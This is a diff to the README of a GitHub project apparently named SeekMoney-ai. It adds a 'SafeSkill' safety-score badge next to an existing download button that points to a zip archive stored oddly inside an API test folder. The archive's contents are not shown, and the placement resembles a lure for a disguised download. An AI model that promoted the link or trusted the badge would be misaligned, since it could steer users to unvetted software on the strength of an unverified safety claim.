@@ -1,6 +1,8 @@
 ```markdown
 # 💼 SeekMoney-ai - Discover Business Opportunities Easily
 
+[![SafeSkill 89/100](https://img.shields.io/badge/SafeSkill-89%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/zykooooooooo-seekmoney-ai)
+
 [![Download SeekMoney-ai](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip)](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip)
 
 ---
